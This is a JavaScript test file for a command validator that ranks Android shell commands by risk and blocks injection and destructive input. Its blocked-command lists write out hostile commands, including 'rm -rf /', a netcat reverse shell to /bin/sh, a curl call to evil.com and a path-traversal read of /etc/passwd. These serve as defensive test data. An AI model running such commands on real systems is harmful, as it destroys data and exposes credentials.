const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const CmdValidator = require('../server/cmd-validator');

describe('CmdValidator', () => {
    const v = new CmdValidator();

    describe('LOW risk commands', () => {
        const lowCmds = [
            'dumpsys battery',
            'dumpsys meminfo',
            'dumpsys wifi',
            'cat /proc/stat',
            'cat /proc/meminfo',
            'df -h',
            'getprop',
            'ps -A',
            'pm list packages',
        ];

        for (const cmd of lowCmds) {
            it(`allows "${cmd}" as LOW risk`, () => {
                const result = v.validateWithRisk(cmd);
                assert.equal(result.allowed, true);
                assert.equal(result.risk, 'LOW');
            });
        }
    });

    describe('MEDIUM risk commands', () => {
        const medCmds = [
            'am force-stop com.example.app',
            'pm clear com.example.app',
            'svc wifi enable',
            'svc wifi disable',
            'input tap 100 200',
            'logcat -d -t 200',
            'screencap -p /sdcard/screenshot.png',
        ];

        for (const cmd of medCmds) {
            it(`allows "${cmd}" as MEDIUM risk`, () => {
                const result = v.validateWithRisk(cmd);
                assert.equal(result.allowed, true);
                assert.equal(result.risk, 'MEDIUM');
            });
        }
    });

    describe('HIGH risk commands', () => {
        const highCmds = [
            'reboot recovery',
            'reboot bootloader',
        ];

        for (const cmd of highCmds) {
            it(`allows "${cmd}" as HIGH risk`, () => {
                const result = v.validateWithRisk(cmd);
                assert.equal(result.allowed, true);
                assert.equal(result.risk, 'HIGH');
            });
        }
    });

    describe('BLOCKED commands (injection / destructive)', () => {
        const blockedCmds = [
            'rm -rf /',
            'rm -rf /system',
            'rm -rf data',
            'echo $(whoami)',
            'echo `id`',
            'ls; rm -rf /',
            'ls && rm -rf /',
            'cat file | sh',
            'nc -e /bin/sh',
            'curl http://evil.com',
            'wget something',
        ];

        for (const cmd of blockedCmds) {
            it(`blocks "${cmd}"`, () => {
                const result = v.validateWithRisk(cmd);
                assert.equal(result.allowed, false);
            });
        }
    });

    describe('DANGEROUS path patterns', () => {
        const dangerousCmds = [
            'cat ../../etc/passwd',
            'cat /proc/kcore',
            'cat /sys/kernel/debug/something',
            'cat /sys/firmware/something',
        ];

        for (const cmd of dangerousCmds) {
            it(`blocks "${cmd}" as DANGEROUS`, () => {
                const result = v.validateWithRisk(cmd);
                assert.equal(result.allowed, false);
                assert.equal(result.risk, 'DANGEROUS');
            });
        }
    });

    describe('UNKNOWN commands (not whitelisted)', () => {
        const unknownCmds = [
            'apt install vim',
            'npm install',
        ];

        for (const cmd of unknownCmds) {
            it(`rejects "${cmd}" as UNKNOWN`, () => {
                const result = v.validateWithRisk(cmd);
                assert.equal(result.allowed, false);
                assert.equal(result.risk, 'UNKNOWN');
            });
        }
    });

    describe('edge cases', () => {
        it('rejects null', () => {
            assert.equal(v.validate(null), false);
        });

        it('rejects empty string', () => {
            assert.equal(v.validate(''), false);
        });

        it('rejects undefined', () => {
            assert.equal(v.validate(undefined), false);
        });

        it('rejects very long commands', () => {
            assert.equal(v.validate('a'.repeat(1001)), false);
        });

        it('validate() returns boolean', () => {
            assert.equal(typeof v.validate('dumpsys battery'), 'boolean');
            assert.equal(v.validate('dumpsys battery'), true);
        });

        it('getRiskLevel() returns risk string', () => {
            assert.equal(v.getRiskLevel('dumpsys battery'), 'LOW');
            assert.equal(v.getRiskLevel('npm install'), 'UNKNOWN');
        });
    });
});
